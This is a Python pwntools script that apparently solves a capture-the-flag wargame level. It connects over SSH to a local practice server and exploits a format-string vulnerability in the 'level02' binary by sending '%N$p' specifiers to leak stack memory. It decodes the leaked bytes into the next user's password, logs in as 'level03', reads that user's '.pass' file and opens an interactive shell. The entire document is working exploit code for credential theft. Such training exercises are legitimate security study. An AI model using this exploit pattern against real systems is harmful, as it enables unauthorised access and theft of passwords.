#!/usr/bin/env python

from pwn import *
import os

cwd = os.getcwd()
host = "127.0.0.1"
port = 4242

login = "level02"
binary = login
password = open(cwd + "/level01/flag", "r").read().splitlines()[0]
remotebinary = "/home/users/%s/%s" % (login, binary)

target_login = "level03"

shell = ssh(host=host, port=port, user=login, password=password)

values = list()

for i in range(22,27):
    p = shell.process([remotebinary], env={})
    p.sendline("%" + str(i) + "$p")
    p.sendline("coucou")
    p.recvuntil("0x")
    value = p.recvall().split()[0]
    values.append(value)

for i, val in enumerate(values):
    values[i] = val.decode("hex")[::-1]

flag = ''.join(values)

print("The flag is %s" % flag)

shell = ssh(host=host, port=port, user=target_login, password=flag)
p = shell.process(["/bin/bash"], env={})
p.clean()
p.sendline("whoami")
p.sendline("cat ~%s/.pass" % target_login)
p.interactive()